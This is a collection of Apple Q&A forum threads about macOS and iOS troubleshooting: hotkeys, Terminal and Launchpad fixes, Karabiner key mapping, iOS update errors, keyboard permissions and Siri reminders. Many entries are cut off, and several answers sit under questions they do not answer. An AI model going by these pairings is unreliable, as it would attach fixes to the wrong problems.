\"Set up\" it empties all the fields and goes back to the email field. Adding a CalDav account reinstated all the calendar accounts (set in Systems Preferences > Internet Accounts).\nThese are the settings I used.\nAccount Type: Manual\nUsername: REPLACE@gmail.com (or username@google_apps_domain.something)\nPassword: App-specific password if you are using 2-step Authentication\nServer: gmail.com\n\nTechnique 2:\nI also tried wrapping my connection with VPN.

This might be Google authentication service issue.\n", "Q: What commonly used hotkeys exist on OS X? Recently began using a mac, but am not familiar with all of the hot keys. Many of them just use Command + key instead of control + key, but not all. \nWhat are some useful, non-application-specific hot keys that anyone could use?  Is there a list of system wide keyboard shortcuts, and how can I find other shortcuts for applications?\n\nA: Shortcuts are often displayed next to their relevant menu item if you are using menus (not so much if you are using icons in an app).  You can just open up many apps and peruse the menus looking for shortcuts that exist that may be useful.\nAnother method is to use the app CheatSheet, this is a free app that essentially goes around hunting for shortcuts that have been officially defined/declared by an app, and when you hold down the Command key for more than a second or so it will present a list of whatever it knows about for the currently active application, allowing you to then complete the shortcut action without having to let for of the key.  A great way to find and learn them, or remind yourself of uncommonly used ones without having to mouse up to the menus.\n\n\nA: Here are some resources to get you started.  As a Mac user who likes to know the fastest way to do things, I approve these links. The first link ought to cover you for most things. I've copied in some highlights. The lists are quite thorough for non-application-specific shortcuts.\nhttp://www.danrodney.com/mac/\nFrom any application\n• Switch between open applications: Cmd + Tab\n• Do the above, but in reverse: Add Shift (Cmd + Tab + Shift)\n• Quit an application from the Application Switcher: while holding Cmd, type q.\n• Switch between windows in an open application: Cmd + Tilde (~)\n• Cmd+H will immediately hide an application from view.

Releasing the tab key and then pressing it again resets the cycle to the beginning. It is not necessary to release command. Releasing taband then pressing shift+tab will reverse scroll through the app listing.\nTo the very best of my knowledge, this behaviour is hardcoded and not configurable by the end user.\n", "Q: Updating Native Mac OSX Mavericks Apache 2.2 to 2.4 - disabling old version?

It now says [Process completed] and does not respond, as it should when every time it exits. Is there a way to configure or re-install the Terminal?\n\nA: By default the $HOME variable is set to your home directory, you have nothing to do yourself in .bash_profile. I think something goes wrong in the process of starting your Terminal session. It is likely that your ~/.bash_profile is corrupt.\nYou can fix this without your terminal:\n\n\n*\n\n*Open TextEdit and press CommandO to open a file.\n\n*Press CommandShiftG and enter ~/ to go to your home directory.\n\n*Now press CommandShift., this will make sure you can see hidden files.\n\n*Open .bash_profile, create a backup if needed, delete the contents and save.\n\n\nThis should fix your problem. You can try this for ~/.profile (if it exists) as well.\nYou can check your HOME variable by opening Terminal and type:\necho $HOME\n\nThis will return your current home directory. It is most likely that you do not want to change this. But if so, it is best to change it just before you run the command, not in your .bash_profile.\n\nThis example will show you how to change your HOME temporarily (for Bash):\n# store original HOME location ('/User/CousinCocaine')\nORIGHOME=\"$HOME\"\n# set new home location    \nHOME=\"/User/CousinCocaine/my/new/home/is/here\"\n# check new home location\necho \"~/ \" ~/\necho \"\\$HOME \"$HOME\"\"\n# set home location back to original\nHOME=\"$ORIGHOME\"\n# test old home location\necho \"~/ \" ~/\necho \"\\$HOME \"$HOME\"\"\n\n\nA: I think the reason your terminal is acting up is that the default command has been changed somehow.\nIn preferences->Startup see what is set\n\nI suspect that the Command is running something other than a shell.

I bring it into the house & update it from iTunes every month or so.\nDon't know how much longer it may last, nor have I ever tested how long the battery charge may last if used unpowered, but it's been no prob so far for my usage needs.\nBased on current wisdom [google for refs, too many to list, idk if any of them are true or just copied the info from another site], it would appear to be best to keep the battery at somewhere between 50% & 80% charge.\nLeaving it plugged in shouldn't damage the battery, as the charger system is smart enough to not allow that - but I don't know how that would affect overall battery life.  \nAs mentioned above, mine gets charged when I'm in the car, sometimes goes weeks between charges, sometimes it's on 8 hours a day.\nSo far, all is still well.\n", "Q: Moving file between disks in Mac OS X? Is there any way so when I drag and drop a file from one disk(A) to another disk(B) the files are moved instead of copied? I have a mac book pro and a mac pro(old cool one) and when I drag and drop files they get copied instead of moved. So could I do some automate script or terminal command to enable move files from disk to disk instead of coping them? \n\nA: Hold the \"Command\" key down, not the \"option\" key, while dragging your file between hard drives.  You will know that you have done it correctly because the progress bar will say \"moving\" instead of \"copying\"\n\nA: On macOS Mojave 10.14:\nTo move files to a different disk: Press and hold the Command key, then drag the files to the disk.\nTo keep an item in its original location and put a copy in a folder: Press and hold the Option key, then drag the item to the folder.\nIn older macOS releases, you could press the option key to change the behaviour\n\n\n*\n\n*move instead of copy between different volumes\n\n*copy instead of move on the same volume\n\n", "Q: Mapping Key (e.g. F15) to Fn Key with no Fn Key on keyboard None of the keys in my keyboard (Microsoft Sculpt Ergonomic Keyboard) are natively recognized as the Fn key by OS X (I checked with Mouseposé)\nI have Karabiner and Keyboard Maestro installed but: \n\n\n*\n\n*Karabiner doesn't seem to have a template to map things to Fn\n\n*As shown below, there doesn't seem to be an option in Keyboard Maestro to enter by hand Fn\nHow can I bind a key (specifically I am hoping to map F15) of my keyboard (e.g. F15 to Fn)?\n\n\nA: Try the DoubleCommand (free, sourceforge) project. According to the features page, you can map the fn key, though it's only listed as partial support.  I don't have any personal experience to share...\n\nA: You can easily map to Fn keys with Karabiner by using a KeytoKey map.  For example, on my Microsoft Sculpt, I wanted the F12 key to show my desktop. The default Mac command for this is F11, but I'd previously mapped F11 to something else.  Luckily, Karabiner maps map to original assignments, not other customizations, so I simply used:\n<autogen>--KeyToKey-- KeyCode::F12, KeyCode::F11</autogen>\nSo when I hit F12, it has the original Mac effect of F11, which is to show my desktop.\n\nA: I had the same problem, but this seems to work on my setup. Not the same keyboard, but an original Windows keyboard without Fn-key (A Saitek).\nYou need to tick the box after writing new items in your private.xml. I.e. the private.xml file doesn´t activate the re-map, just makes it an option in the \"Karabiner Preferences\" (on top).

After running screen and creating another window (ctrl+a, c), the split command (ctrl+a, |) won't do anything. Normally it's suppose to split the terminal vertically into two separate windows (typically used to edit and test in one terminal window).\nAny suggestions?\n\nA: I think what you want is to ctrla,shifts (split first), and then ctrla,tab to switch to the new region.  Now you can ctrla,c to create a new shell in that new region.\nIf you want vertical split, be sure to check the version of screen that you're running.  According to this Unix SE answer, vertical split is NOT a default feature and needs to be patched in.\nThe TL;DR of it is: you'll need to download and compile a new screen command with the appropriate patch (or at least a newer version if the patch has been merged into the main project). \n\nA: I've searched for quite a while, it turns out the Mac distro of GNU screen did not incorporate the vertial split function. You need to either patch it by yourself or wait until it is ported.

It's a feature from snapchat and the list is provided from the snapchat's servers. So even if you hide it on your application, it will be visible for others for whom the data will be directly served from the Snapchat servers.\nAccording to the snapchat support, Best Friends are updated regularly and represent the friends you Snap with most frequently. They are selected automatically by a magical Snapchat friendship algorithm.\nThere isn't anything much you can do about this. Other than blocking the users for a random period of time to remove their names from the list.\n\nA: There is no way to \"delete\" best friends, but a simple fix is to block the person you sont want on your list which will reset you and their chatting score to 0. Making them not one of your best friends after blocking them make sure to unblock them and they will return to your contacts but NOT your best friend list.\n", "Q: Mail/iCal: How to decline with text / answer mail?

However, I stumbled across this Homebrew-equivalent for Apps a few weeks ago and am loving it: Homebrew Cask. I was already a Homebrew fan for command line app and package management and Cask task it's same, simple command line and applies to fetching and installing Applications on my OS X machines.\nIf you already have Homebrew, getting Cask is simple:\nbrew install caskroom/cask/brew-cask\n\nNow I can use the cask command to install Applications. It does the same symlink-managed sharing philosophy brew does for managing things. Let's say I wanted Google Chrome:\nbrew cask install google-chrome\n\nand I've got it.\nTo see a list of Applications available for install with cask do:\nbrew cask search\n\nYou can now script Application installation with relative ease. Even if a system doesn't have brew on it, you can just add a check-and-install section to your script to set it up on first run.\n", "Q: Why won’t iPhoto open my iPhoto Library any more? My copy of iPhoto has stopped opening my iPhoto Library.\nWhen I open iPhoto, it shows me an empty “Which photo library do you want iPhoto to use?” window.

And, more importantly, how can I make it open the Library again?\n\nA: Unfortunately, I'm not super familiar with the inner workings of the library file.  You can copy the masters out and reorganize them into a new library so that your pics aren't lost:\n\n\n*\n\n*open a terminal window\n\n*type mkdir ~/Desktop/RecoveredPicsEnter.  This creates a new folder on your desktop where your recovered masters will live.\n\n*type (but do not hit enter) find make sure to leave a space\n\n*drag the iPhoto library into the terminal window.

And I do mean completely: it won't respond to any keyboard input, I can't even move the cursor, and even animations (like a scrollbar fading in/out) will freeze in place.\nUsually if I just let it sit for 10 seconds or so, it'll \"catch up\" with itself and then work like normal. But other times it just hangs there indefinitely, and I have to force reboot it by holding the Power key to turn it off (which I did just now).\nHere's my last log message before it froze and I rebooted:\n9/17/14 12:59:06.812 PM com.apple.backupd[67739]: 1.48 GB required (including padding), 2.6 TB available\n9/17/14 1:05:21.000 PM bootlog[0]: BOOT_TIME 1410973521 0\n\n(Note the 6-minute gap there: it doesn't even record any log messages while it's frozen.)\nOf interest, Time Machine says my last successful backup was at 11:23 AM, which means it froze while it was in the middle of the next backup (which would have started at 12:23, and did according to the logs).\nCould that mean Time Machine has something to do with it? I haven't noticed any rhyme or reason as to when or how often the freezes occur.\n\nUpdate: this just happened again, but this time it caught up after maybe 20 seconds or so. It definitely seems to have something to do with Time Machine: the freeze occurred at 5:43 PM, and after it unfroze, I checked and the last backup was performed at 4:43 PM. So it froze exactly when the backup was supposed to start.\nI'm backing up to a NAS, so I wonder if it's having trouble connecting and that's causing the whole UI to lock up. It did start a few minutes later and now seems to be working fine.\n\nUpdate 2: I've had this happen a few more times, and now it doesn't seem like it's related to Time Machine at all since the timing doesn't line up.\nIn the console, it says kernel[0]: Previous shutdown cause: -112 from when it froze yesterday, and kernel[0]: Previous shutdown cause: -128 from when it froze today. I can't find anything definitive about what either of those error codes mean.\n\nA: I've experienced both the -112 and less often the -128 and submitted the error logs to engineering.

They costs my time and money when I use them by accident. \nI want to change the default app to Google Maps. \nHow can you change the default Map application in the newest iOS to Google Maps?\nI really would like to delete the Apple Maps from my phone.\n\nA: You can't change the default app. Some apps give you the option to choose which app to open maps/directions in, but this varies per app and app developer. There is no system toggle and Safari/Siri/etc will continue to open maps in Maps.\n\nA: As of iOS 10 you can delete the iPhone maps application. If you click on a Google Calendar destination, you will then get a message saying the Maps app is missing. Ignore that message. Hold down a finger on the address, select copy, open Google Maps and paste the address you just copied.

I'm from Bulgaria (but this problem might not be Country related) and after update to iOS-8, I can't turn off my 3G or I have the option to turn on/off LTE only. \nI don't want to be always on 3G because my battery consumption.\n\nA: I don't there is anything much you can do now since this is a change to iOS. After the update the toggle is only between 3G and LTE and no more 2G and 3G toggle. Also, you won't be able to revert to iOS 7 for long if at all, so try that if you really must revert this functionality.\n\nFrom an experience standpoint, I really don't think you will run out of battery if you're on 3G. I would advise you to not use mobile data while travelling around a lot because with frequent changing of signal towers could lead to draining of battery.\nAlthough I've seen a method to edit the preference file after jailbreak to fix this issue but it never worked for me.\n\nA: I'm sympathetic to people in this situation since when the cellular radio is turned to max power to reach a distant cell tower, the battery drains several times more rapidly than if you were where coverage is good.\nIn the short term, here's things you can do to improve things:\n\n\n*\n\n*Leave LTE on and turn on sharing data with Apple. Show that the battery life is far less than before.\n\n*Open an AppleCare ticket and a support ticket with your wireless carrier. Both track the volume of issues and can perhaps push out a software change to address this change for people like you.\n\n*Get a micro hotspot to boost the base station your device connects to.\n\n\nLong term, unless the software goes into power savings mode more aggressively (or the function is still the same even though the label is different) - only a fix from Apple or your carrier building closer base stations will let your phone get longer battery life by reducing the power to the antenna.\n", "Q: Trying to find the board ID for Mac Pro 1,1 (no OS currently installed, can't access terminal) I'm trying to install Mavericks on an old MacPro1,1 (This one), and I need the correct board ID to properly configure the USB install.

A keyboard I recently installed on iOS 8 provides an option (in Settings) to \"Allow Full Access\"?\nWhat does this setting do?\n\nA: If you try it it will inform you of this:\n\nUsers can tap the keyboard name from here and check a box for \"Allow\n  Full Access.\" Doing so presents the user with another prompt that\n  reads:\n\"Full access allows the developer of this keyboard to transmit\n  anything you type, including things you have previously typed with\n  this keyboard. This could include sensitive information such as your\n  credit card number or street address.\"\nIf the user chooses to accept this prompt and allow the keyboard, it\n  can now be accessed systemwide. When the virtual keyboard pops up,\n  simply tap the globe icon in the bottom left corner to cycle through\n  available keyboards, or hold down on the icon to pop up a list.\n\nSource: http://appleinsider.com/articles/14/09/17/how-to-install-a-third-party-keyboard-on-an-iphone-or-ipad-running-ios-8\n\nA: \"Allow Full Access\" has nothing to do with using the actual keyboard. The keyboard is accessible for you to use throughout the system regardless of this setting. In short, allowing full access grants the developer of the keyboard additional access to some of your information and gives the developer access to the internet. From the technical specifications under \"Designing for User Trust\", Allow Full Access does this:\n\n\n*\n\n*Keyboard can access Location Services and Address Book, with user permission\n\n*Keyboard can send keystrokes and other input events for server-side processing\n\n*Containing app can provide editing interface for keyboard’s custom autocorrect lexicon\n\n*Keyboard can employ iCloud to ensure settings and autocorrect lexicon are up to date on all devices\n\n*Keyboard can participate in Game Center and In-App Purchase\n\n\nThe second bullet point is what Apple really wants you to understand. With Allow Full Access a developer COULD send your keystrokes to their server for processing, which might include:\n\n\n*\n\n*analyzing your sentence for grammar\n\n*analyzing a word for spelling\n\n*predicting the word you are typing.\n\n\nApple is highlighting the fact that a developer COULD use your keystrokes for nefarious reasons instead of the legitimate reasons I listed above. It is possible for a developer to record your sensitive information such as credit card number or street address.\nIn my opinion, it is not possible for a developer to write a fully-fledged keyboard extension without requesting full access. Without Full Access I can't utilize In-App Purchases, I can't sync your preferences using iCloud, I cannot even provide a basic auto-correct feature.\nI just finished developing a keyboard extension for iOS. My keyboard never sends your keystrokes across the internet. I will never see what you have typed. There are no privacy concerns in my opinion, yet you still receive a scary message from Apple when you turn on Allow Full Access. If you have concerns about turning Allow Full Access ON, ask the developer how they are using your data/keystrokes.\nOne additional note, you cannot use a custom keyboard to type into a password field. iOS will always use the system keyboard for password fields. Developers that do process your keystrokes will not have access to your passwords, unless you type your passwords into a non-password field.\n", "Q: iTunes sync management I have an iPhone5 that was synced to a PC when I first got it.\nI had an older BlackBerry that had hundreds of pictures and I wanted them transferred to the iPhone which is why the sync happened. I had a friend do it, and now I'm trying to upgrade the phone to iOS 8 but I don't have enough space.\nI tried to delete some photos but I noticed that hundreds of these photos are in albums that are labeled \"from My Computer\" and are unable to be deleted.\nI no longer have access to that original computer that synced the photos, what can I do if I want to keep the photos, but remove them from the phone?\n\nA: Right now what I'm doing is emailing each photo to myself, that way I have the actual photo file in a non-locked-down format, and then syncing the iPhone to a new computer with 0 photos to clear the previous sync.\nI find this restriction from Apple rather backwards logic and not very user friendly. Why lock down photos? They aren't copyrighted MP3 files or MP4 files, they are photos that I personally took, and the fact that I can just email them to myself to create new copies of the file shows that this security lock down isn't secure at all. Disappointed with the decision makers on this one.\n", "Q: What resources are shared in iCloud Family Sharing? I have been trying to get a handle on iCloud Family sharing before I turn it on. There are two potential issues I could see having with it. First, is iCloud storage space shared amongst the accounts or is it linked a particular Apple ID. Second how does PhotoStream work with it. My wife and I currently like sharing all our photos so we can see what the kids are up to when they with one or the other of us. Will that still be the case?\n\nA: iCloud storage is not shared. Of course I realized this after upping my storage. Really this is an odd solution to use as just sharing an iCloud id between devices does the same thing AND let's you share the increased iCloud storage for backups and other things. Was hoping this would help my wife out since she hates getting my notifications and warnings every time I add a device/service or two-factor authenticate. Oh well, maybe in a future version they will refine and add features.\n\nA: According to Apple's Terms and Conditions:\n\nYou can share information such as photos and videos via the Photo app, events via your Family Calendar, reminders via the Reminders app, location information via Find My Friends, and device location via Find My iPhone. \n\nThis may not be an exhaustive list.\n", "Q: Help, I can't search from the App Launcher anymore I used to be able to start typing an application name in the App Launcher (F4) to filter the list. But at some point, this stopped working for some reason. I can't click the search box, nor does typing produce any characters into the search box.\nIs there a setting I can flip, or could this be an issue with a corrupt system file?\n\n\n*\n\n*Mac OS X 10.9.4 Mavericks\n\n*MacBook Air mid-2013, Intel Haswell Core i7\n\n\nA: Run this in your Terminal to clear the Launcher.\nsqlite3 ~/Library/Application\\ Support/Dock/*.db \"DELETE from apps; \\\nDELETE from groups WHERE title<>''; DELETE from items WHERE rowid>2;\" \\\n&& killall Dock\n\nWhen this is done, you will have a marvelously blank Launchpad interface, so to add your applications again all you have to do is drag them to the Launchpad icon in the Dock (drag the Launchpad program itself from the /Applications folder to the Dock if it is not already there). Any new applications you purchase through the Mac App Store will be automatically added to Launchpad.\nBe sure to back up the database file before you alter it by copying it to your Desktop or another safe location. If for some reason you have messed up Launchpad and wish to restore your previous settings then you can restore the backup (or even use Time Machine to restore a previously backed up database file) and then log out and log back in to your system.\nAlternatively, if you wish to reset the Launchpad to its default settings and organization, then all you need to do is delete the database file. To do this, press the Option key and choose Library from the Go menu in the Finder, and then navigate to the /Application Support/Dock/ folder and remove the \".db\" file (it will have a long string of letters and numbers as its name). Or you can run the following command in the Terminal:\nrm ~/Library/Application\\ Support/Dock/*.db\n\nSource: http://www.cnet.com/news/how-to-reset-and-manage-the-os-x-10-7-launchpad-interface/\n\nA: Updating to Mac OS X 10.9.5 Mavericks fixed the problem.\n", "Q: Can a SSH session be wrapped to appear as a distinct App? Fluid can create a .app wrapper around a webkit instance to turn any web page into an OSX Application. This script can do a less thorough job with Chrome. Is there anything that can do this for a ssh session, possibly through a Terminal or iTerm2 profile, or a standalone SSH client?\nTo elaborate:\nI open Safari, then open a second Safari window for a particular website. Now cmd+tab and force quit and mission control and the dock and many other OSX features treat those two windows as part of the same app.\nInstead, after opening Safari, I can open my created-with-Fluid custom .app for the particular website. This gives me all the OS-native features of having two separate apps running.\nAnalogously, in Terminal or iTerm2 or a standalone SSH client (e.g. CyberDuck or SecureCRT) I can open a second window with a particular profile loaded that will ssh to a certain server. That window will, again, be treated by the OS as part of the single running app.\nI am hoping for something like Fluid that will create a .app wrapper around any method of opening an SSH session to a particular server, which will then stand alone from any other SSHing I'm doing in my normal usage.\n\nA: The only way to run multiple, separate instances of Terminal is by launching them with the command line open -n -a \"Terminal\" -- understand that this isn't a great way to run things that aren't meant to be run like this. There are shared preferences and plist files being used by these instances so you may run in to trouble.\nThe reason Fluid works so well is each app is a separate WebKit browser instance, with a unique preference namespace, and without the normal browser window decorations. It's a heavy hack to say the least.\nYou can script Terminal with AppleScript and then save the AppleScript as an application. This script forces a new instance of Terminal to the foreground and then runs an ssh command in it:\ndo shell script \"open -n -a Terminal\"\ntell application \"Terminal\"\n   set currentTab to do script (\"ssh user@server;\")\n   # Additional commands can be sent using...\n   # delay 6\n   # do script (\"do something remote\") in currentTab\nend tell\n\nEnter that in to the AppleScript Editor, customize it as suits your needs, and then select File > Save... and where it says Type: in the Save dialog select Application.\nThis will create an unsigned .app file you can distribute as an Application to start ssh sessions. If you have a developer certificate and want to code sign the .app so users don't get a warning about running untrusted code use the File > Export... menu option, select Application for the Type and make sure the Code Sign: option in the dialog pointing to a developer certificate instead of Don't Code Sign.\nIt is preferred to code sign the app if you're going to give the app to other users.\nIf you run that, you'll get entirely new Terminals started, independent of each other, that you can Cmd-Q quit without quitting the other instances. Replace Terminal in the script with iTerm if you prefer it for your command line work.\n", "Q: How do I disable \"Enable Autofill using Contacts...\"? I get this notification on forms in Google Chrome. What is prompting it and how do I turn it off?\n\nI searched through Chrome's settings but the only part that appeared to be relevant was unchecked:\n\nSo I'm thinking this might be a system setting, even though it has only appeared recently?\n\nA: This appears to be a bug. A solution online recommends\n\n\n*\n\n*Go to a form such as the USPS ZIP lookup\n\n\n*Start to fill it, and click \"enable autofill\" when it appears.\n\n\n*If prompted for permissions to let Chrome use contacts, do not allow it.\n\nJust clicking the enable autofill once appeared to do the trick for me—I think my Chrome was already blocked from my contacts.\n", "Q: How to trigger Notification Centre notification from JavaScript?

I installed iOS 8 on my iPhone 5S today and the got the Health app as a result.\nIt shows on the Health app that it can get data when the app \"sends\" data over to the Health app.  So I assume Nike Running (an app from Nike) probably has that built in?

I usually do this wireless via the phone settings, but yesterday I chose to update from iTunes. So I connected my iPhone 5 to my PC, made a backup and started downloading the newest iOS.\nAfter 30 minutes of downloading it told me something like \"The firmware is damaged\" and asked me to disconnect the phone from the PC and plug it in again. I've done that, and tried it again. Another 30 minutes later (the downloaded ISPW wasn't saved anywhere, iTunes just disregarded it) the same error popped up.\nSo I went ahead and downloaded the correct ISPW (iPhone5,2_8.0_12A365) via my browser, which worked. Next I shift-clicked the \"Update\"-button in iTunes, chose this .ispw and started the update. After fixing a error 3194 (by manipulating my PC's hosts-file) I got my iPhone to start updating for a couple of seconds. Then iTunes terminated the update with an error 14. Now my iPhone is stuck in restore mode and every time I try to update it, it either gets stuck while \"restoring iPhone-software\" at ~10% (I've been waiting for 20 minutes, the progress bar didn't even move a bit) or stops with the error 14 again.\nWith my luck I've tried the same thing with my iPad mini (Retina)... Same result, device is now stuck in restore mode and won't update due to error 14.\nI've tried another PC, another cable, another USB port, switching it into DFU-mode (it jumps right back into restore), nothing worked.\nI've been trying to fix it for the last 5 hours, but hadn't had any luck so far. I hope someone can assist me.\n\nA: I experienced this (error 14) when updating my iPhone 6.  I backed up the phone and apps in iTunes while downloading the OS update to iTunes.  Then I chose the iTunes Update Now button.  It took 18 minutes to arrive at the error code 14.  My phone then disconnected from my computer and could not be SEEN by my computer until I plugged the USB cable into a different USB port and then plugged in the phone. I was only given a choice to quit or totally reset the phone.  I did a reset which resulted in a choice to have a new phone or to restore it.  The first and second restore attempts failed. I chose restore from the phone choices.\nIt worked when I used the restore button from iTunes instead of using the choice on the phone.

Is it possible to have my iPhone making a sound every hour ? And preferably during day time, like 12 hours a day, and moreover only during weekdays only ?\n\nA: Well – you can either set up returning alarms – but I suppose you already came up with that idea yourself. Or you can use one of those many many apps for hourly chimes. This overview claims to have a list of over 50 apps doing just that (and more) www.appcrawlr.com/ios-apps/best-apps-hourly-chimes\nThe first app I see in the list (\"chime\") seems to be doing exactly what you describe, available on the iTunes App Store at Chime\n\nA: YES, you can setup an hourly chime on an iPhone WITHOUT downloading an app or any Jail Breaking for FREE!  With just using sounds already on your phone, or any custom tone you create. And you can further tweak it so it doesn't block or lock up your phone when you are being alerted of the passing hour. \nOVERVIEW:\n1) Using SIRI to set up a DAILY reminder that alerts you every hour and repeats INDEFINITELY.\n2) Just alerts you of the passing hour with no other intrusive notifications.\n3) Brain hack for the neurotic: Choosing a ringtone that is soothing or has a positive association.\n4) Cons (that I ran into).\n5) Taking your reminders further.\n6) Positive feedback from you.  \n---Worked as of 03/15/2016.\n---Version: iOS iPh5 9.2.1, iOS iPh4 7.1.2 \n---Tested on: iPh5 and two iPh4 Note: Siri does not work on iPh4, but linked devices automatically carry over information if spoken through the iPh5. I don't own a iPh6, but it should be the same.\n---Time to finish: 'Bout 5-10mins.\nYou'll be doing this with Siri and the \"Reminder\" app, which comes FREE with the iPhone.\n\nLet's Begin:  \n1) Hold down the center home button and say: \n\"Remind me EVERYDAY when it's 12 O'clock A.M.\"\nSiri will say: \"OK, just tell me what you want to be reminded about.\"\n(This is the title of the Reminder. Siri no longer gets caught up in a low A.I. logic loop. So, it can be anything you think of relevant or non-relevant.  So, mentioning the time twice will no longer trip up Siri, but it will make sense if the title name is meaningful to YOU, because you're about to add at least 24 new reminders where meaningful title names will make it easier to distinguish between a sea of other possible reminders.)\nSo, hypothetically, you COULD say: \n\n\n*\n\n*\"Alert this Bitch everyday at 12 A.M.\" or;\n\n*\"Dude, tick-tock it's 12 o'clock or even non-sense like;\n\n*\"Stick and berries make the world go 'round.\"\n\n\nThe logistics no longer matter to Siri, BUT to make sense at some later point in the future for yourself, I would repeat the time, specify A.M. or P.M. and the occurrence.  Something like this:\n\"It's 12 A.M. again.\"\nSIRI then will say: \"OK, I'll start reminding you.\"\nShe'll show you:  \n\n\n*\n\n*The newly created Reminder, \n\n*Its creation date, \n\n*The title name you choose for it, \n\n*The time the reminder is set for, \n\n*and the reminder's occurrence status.\n\n\nYou could review the Reminder's setup by tapping it, or manually close the screen, or do nothing and let the screen fade to black. \nRepeat 23 more times.  Relax. Siri makes it a 5 min task!  At this point you're 99% done. \n2) Now on to how Reminders will notify you.  Turn off all intrusive visual notifications of the reminder alert, which can interfere with you if you are driving with map directions, using your phone as night clock, scrolling through music, or just plain texting.\nOpen Settings> Notification Center> Reminders.\n\n\n*\n\n*Notification Sound: Choose your Apple sounds or import your own.\n\n*Badge App Icon:  Toggled OFF.\n\n*Show on Lock Screen:  Toggled OFF.\n\n*ALERT STYLE WHEN UNLOCKED (Three images of iPhone alerts examples): Tap the \"NONE\" image.\n\n\nThis needs to be set only 1 time NOT 23 more times, because there's only one Reminder App.  We didn't magically create 24 or more.\nALL DONE!!\n\nNutshell Review: \n\n\n*\n\n*Hold down center the button to engage Siri. \n\n*YOU SAY: \"Remind me EVERYDAY when it's 12 O'clock A.M.\"  \n\n*Siri then will say: \"OK, just tell me what you want to be reminded about.\"  \n\n*YOU SAY: \"It's 12 A.M. again.\"\n\n*Siri then will say: \"OK, I'll start reminding you.\"\n\n*Manually click-close your screen.  \n\n\nRepeat 23 more times.\nOpen Settings> Notification Center> Reminders.\n\n\n*\n\n*Notification Sound: Choose your Apple sounds or import your own.\n\n*Badge App Icon:  Toggled OFF.\n\n*Show on Lock Screen:  Toggled OFF.\n\n*ALERT STYLE WHEN UNLOCKED (Three images of iPhone alerts examples): Tap the \"NONE\" image.  \n\n\n\n3) Using your own chime:  The psychological aspect behind choosing the right sound:\nTry to begin to associate relaxing sounds with intense people and things, so if you get a text from your crazy mom, or your drama infused sister, choosing a non-toxic sound won't automatically place you on edge, or place you in a worrisome state of mind. You want to be open minded and level headed to deal with their nonsense. \nSimilar rational with choosing the right ringtone for your hourly chime. You don't want the sound to be intrusive when you're sleeping, and while awake you want the sound to always say this:\n\"One more hour of my life has just passed.  What positive thing have I done with this precious time?\"  \nMy soothing alert comes from Halle Berry's new Sci-fi Drama \"Extant\". This is the 21sec end theme I find amazingly relaxing: http://m.televisiontunes.com/Extant_-_Ending.html\n4) The only CON I ran into so far is the assigning of different sounds to multiple reminders. Example: I really don't want my hour chime to be the same for a reminder to pick up some milk on the way home.\nUntested work around You could also use the Calendar app and tweak the Notifications for it in settings...Hmmm.\n5) Taking your reminders further. Did you notice location services in the tweak options. Imagine just having your alert go off only at work, or at the library.

Simple application for beeps \n", "Q: Why does a short video recorded on the iPhone have almost the same file size as a full HD movie? Videos recorded on the iPhone are huge. I don't know where I'm supposed to store those videos. Even with 1TB of storage, I'd run out of space if I regularly recorded & stored these huge files. Also, they're cumbersome to transfer and stream.\nWhy are they so big anyway, and is there anything that can be done about that?\n\nA: The answer boils down to how much work the compression algorithm can do to squeeze the file down, and how much quality loss you are willing to tolerate.\nDark Knight on Blu-ray uses VC-1 encoding at 24Mbps, and it's around 27GB on disk. Good thing BDs have so much room! The goal is to give really good quality.\nThe iPhone encodes things around 17Mbps (according to the file I just checked) using h.264 with the High@L4.1 profile. It has to encode things in real-time because it can't stream the raw video to flash. Doing things in real-time limits the amount of work the compressor can do and results in higher file size than slower compression. The iPhone could probably choose to degrade the quality of the video in order to get smaller files, but since you can never get quality back, it makes sense to keep quality there at the beginning.\nThe BD rips you're talking about have two things in their favor.  One is that people are willing to accept a much lower quality than the BD in order to shrink the file size. Also, they have plenty of time to compress the files, so they can easily compress at half or quarter real time.  That lets the compression algorithms find a lot more ways to shrink the file size without degrading quality.\nIf you want to store the iPhone videos yourself for later viewing, you can certainly transcode them yourself and shrink them. You probably would not want to use the results for a television ad but they would be perfectly good for keeping memories.\n\nA: HD Videos take up lot's of space. iPhone 5 Video's are going to be in the neighborhood of 120MB - 180MB per minute (depending on compression). Some apps will allow you to record at lower resolution then 1080i if space is an issue.\n\nA: I believe the answer he is looking for lies in the amount of processing power that an iPhone or other device would need in order to:\n\n\n*\n\n*capture video\n\n*compress the captured video in realtime to a format and settings that would result in those smaller \"compressions\"\n\n*write it to disk\n\n\nThe iPhone has plenty of processing power to capture the video and write it to disk, but it would be difficult, if not impossible for it to capture video, compress it to an extremely efficient, and small file size, and write it to disk in realtime.\n\nA: just FYI, one workaround I've discovered for sharing large videos direct from the iphone: \nDon't start at the video. Just write and email. When ready, hold your finger down in the body of email. instead of copy and paste, go to the options to the right, and you'll have \"insert photo or video\" . then you can go to your camera roll, and pop any video in, and it will be compressed to %10 of it's original size, and fine for viewing on tiny screens. \n", "Q: Is WiFi calling supported on ios 8 on iPhone 5?

Sorry for not having researched that more thoroughly before asking the question.\n\"Generate e-mail messages\" in the last step was greyed out because Microsoft Outlook was not the default email application. So to make it work:\n\n\n*\n\n*(Temporarily) Make MS Outlook the default email application: This is an option within the Mail.app preferences.\n\n*Go through the usual mail merge steps. Note that the email-address does not need to be in the Word message, but I would recommend to have it as a field in the Excel sheet.\n\n*In the last step the \"generate e-mail messages\" option should not be greyed out anymore. Select it.\n\n*A small window pops open. Among other options (Subject, for example) the field containing the email address can be chosen here. \n\n*The format can be chosen as \"Text\", \"HTML\" and \"Attachment\".

(even though the message doesn't make sense, we are setting the Swipe Right and not the Swipe Left as Archive).\n\nA: You're in luck - it's there. You just need to swipe faster and further to the left. Make it a \"full sweep\" from right to left. \nThis'll result in immediately deleting the mail message.

It does not delete the message from the Gmail account. You can learn more about the Gmail archive feature in Gmail Help. Archive replaces all delete options when you use a Gmail account, including tapping the Trash icon while you view  a message and selecting Edit to manage multiple messages.\nYou can disable this feature in Settings > Mail, Contacts, Calendars > Gmail Account > Account > Advanced > Move Discarded Messages Into:\n\nA: As pointed out by Yariv Nissim above, there is a hidden preference in the iOS options that will give you BOTH delete and archive as swipe options. \nGo to Mail > Preferences > Swipe Options, and select “Archive”. You will then see a message below that says “Accounts that include Archive as a default action for swiping left will offer Delete for swiping right”. I can confirm that this still works in iOS 13.

